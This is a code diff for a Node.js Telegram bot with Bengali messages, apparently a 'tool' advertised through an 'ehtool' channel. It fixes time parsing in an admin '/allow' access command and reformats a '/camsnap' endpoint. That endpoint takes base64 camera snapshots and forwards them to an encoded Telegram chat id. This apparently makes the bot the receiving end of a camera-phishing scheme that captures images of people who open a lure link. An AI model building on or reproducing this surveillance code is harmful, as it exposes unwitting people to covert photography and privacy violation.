@@ -120,7 +120,7 @@ bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি �
 \n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
 `);
 }
-// নতুন কমান্ড: /allow <chat_id> <time>
+// নতুন কমান্ড: /allow <chat_id> <time> - FIXED LOGIC
 else if (msg.text.startsWith('/allow')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
@@ -136,27 +136,52 @@ else if (msg.text.startsWith('/allow')) {
 
         let duration = 'forever';
         let expiresAt = 'forever';
+        
         if (parts.length > 2) {
             duration = parts.slice(2).join(' ');
             const now = new Date();
             const timeValue = parseInt(duration);
+            
+            // 🛑 FIX 1: Invalid timeValue (NaN) check
+            if (isNaN(timeValue)) {
+                bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
+                return;
+            }
+            
+            let timeSet = false;
             if (duration.endsWith('m')) {
                 now.setMinutes(now.getMinutes() + timeValue);
+                timeSet = true;
             } else if (duration.endsWith('h')) {
                 now.setHours(now.getHours() + timeValue);
+                timeSet = true;
             } else if (duration.endsWith('d')) {
                 now.setDate(now.getDate() + timeValue);
-            }
-            expiresAt = now.toISOString();
+                timeSet = true;
+            } 
+            
+            if (timeSet) {
+                // 🛡️ FIX 2: Final safety check (now.getTime() Invalid Date-er jonno NaN return kore)
+                if (!isNaN(now.getTime())) {
+                    expiresAt = now.toISOString(); // Ekhane Line 150-er error solve hoye gelo
+                } else {
+                     bot.sendMessage(chatId, `⚠️ দুঃখিত, সময় গণনাতে একটি গুরুতর সমস্যা হয়েছে। আবার চেষ্টা করুন।`);
+                     return;
+                }
+            } else {
+                // If the duration format was incorrect (e.g., a number without m/h/d)
+                bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
+                return;
+            }
         }
-        
+        
         allowedUsers[userIdToAdd] = { expires: expiresAt };
         saveAllowedUsers();
 
-        const messageToUser = duration === 'forever' ?
+        const messageToUser = expiresAt === 'forever' ?
             `অভিনন্দন! আপনাকে লাইফটাইমের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।` :
             `অভিনন্দন! আপনাকে ${duration} সময়ের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।`;
-        
+        
         bot.sendMessage(userIdToAdd, messageToUser);
         bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} সফলভাবে অনুমোদিত তালিকায় যুক্ত করা হয়েছে (${duration} এর জন্য)।`);
 
@@ -313,37 +338,37 @@ res.send("Done");
 
 
 app.post("/camsnap",(req,res)=>{
-    var uid=decodeURIComponent(req.body.uid) || null;
-    var img=decodeURIComponent(req.body.img) || null;
+    var uid=decodeURIComponent(req.body.uid) || null;
+    var img=decodeURIComponent(req.body.img) || null;
 
-    if(uid != null && img != null){
-        
-        // এখানে সরাসরি Base64 ডেটা ব্যবহার করা হয়েছে, কারণ ক্লায়েন্ট-সাইড কোড প্রিফিক্স মুছে দেয়।
-        const base64Data = img;
-        if (!base64Data) {
-            console.log("Empty Base64 data.");
-            res.send("Empty Base64 Data");
-            return;
-        }
+    if(uid != null && img != null){
+        
+        // এখানে সরাসরি Base64 ডেটা ব্যবহার করা হয়েছে, কারণ ক্লায়েন্ট-সাইড কোড প্রিফিক্স মুছে দেয়।
+        const base64Data = img;
+        if (!base64Data) {
+            console.log("Empty Base64 data.");
+            res.send("Empty Base64 Data");
+            return;
+        }
 
-        try {
-            var buffer=Buffer.from(base64Data,'base64');
-            var info={
-                filename:"camsnap.png",
-                contentType: 'image/png'
-            };
+        try {
+            var buffer=Buffer.from(base64Data,'base64');
+            var info={
+                filename:"camsnap.png",
+                contentType: 'image/png'
+            };
 
-            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
-            res.send("Done");
+            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
+            res.send("Done");
 
-        } catch (error) {
-            console.log("Error processing image:", error);
-            bot.sendMessage(parseInt(uid,36), `⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।`);
-            res.send("Error");
-        }
-    } else {
-        res.send("No Data");
-    }
+        } catch (error) {
+            console.log("Error processing image:", error);
+            bot.sendMessage(parseInt(uid,36), `⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।`);
+            res.send("Error");
+        }
+    } else {
+        res.send("No Data");
+    }
 });
 
 
